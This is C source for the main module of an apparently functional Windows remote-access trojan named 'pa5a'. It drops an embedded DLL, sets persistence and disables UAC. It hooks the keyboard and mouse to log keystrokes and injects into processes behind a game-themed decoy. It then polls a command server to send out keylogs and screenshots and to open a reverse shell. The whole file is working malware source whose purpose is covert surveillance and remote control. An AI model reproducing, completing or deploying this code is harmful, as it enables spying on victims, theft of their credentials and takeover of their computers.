#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************************************/
DWORD ThreadKeylogger()
{
    //Hooks sur le clavier et la souris pour le keylogger
    if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
        ExitThread(EXIT_FAILURE);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ExitThread(0);
}
/********************************************************************************************************************************************************/
DWORD ThreadReverseShell()
{
    if (WS_Connection() == FALSE)
    {
        printf("Failed to initiate connection with the server\n");
        ExitThread(-1);
    }

    ExitThread(0);
}

/********************************************************************************************************************************************************/
BOOL WritePa5aDll()
{
    HANDLE hDll = NULL;
    CHAR filename[PATH_SIZE] = {0};

    HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    DWORD myResourceSize = SizeofResource(NULL, myResource);
    HGLOBAL myResourceData = LoadResource(NULL, myResource);
    PVOID pMyBinaryData = LockResource(myResourceData);

    if (StringCbPrintfA(filename, sizeof(filename), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
        return FALSE;

    if ((hDll = CreateFileA(filename, FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!WriteFile(hDll, pMyBinaryData, myResourceSize, NULL, NULL))
        return FALSE;

    CloseHandle(hDll);

    return TRUE;
}
/********************************************************************************************************************************************************/
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow) 
{
    CreateConsole();

    CreateDirectory(DATA_FOLDER_W, NULL);

    wprintf(L"command line : [%ls]\n", lpCmdLine);
    
    //Ajout de la persistance
    printf("%s\n", WritePa5aDll() ? "DLL -> OK" : "DLL -> ERROR");
    printf("%s\n", SetPersistence() ? "Persistence -> OK" : "Persistence -> ERROR");
    printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");

    HANDLE hThreadKeylogger = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);

    if (!StrStrW(lpCmdLine, L"/silent"))
    {
        HANDLE hThreadLeagueOfLegends = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadLeagueOfLegends, NULL, 0, NULL);
    }
    else
    {
        HANDLE hThreadInjector = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadInjector, NULL, 0, NULL);
    }

    while (TRUE)
    {
        printf("Sending client informations\n");
        if (!SendClientInformations())
            continue;

        //Polling for new commands
        printf("Polling for new commands ...\n");
        Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);

        if (commands.keylogs)
        {
            printf("Sending keylogs ...\n");
            SendKeylogs();
        }
        if (commands.screenshot)
        {
            printf("Sending screenshot ...\n");
            CreateDirectoryW(DATA_FOLDER_W, NULL);
            SendScreenshot();
        }
        if (commands.reverseShell)
        {
            printf("Opening reverse shell ...\n");

            //Thread de Reverse Shell
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadReverseShell, NULL, 0, NULL);
        }

        Sleep(1000);
    }

    return 0;
}
/********************************************************************************************************************************************************/

EXTERN_C_END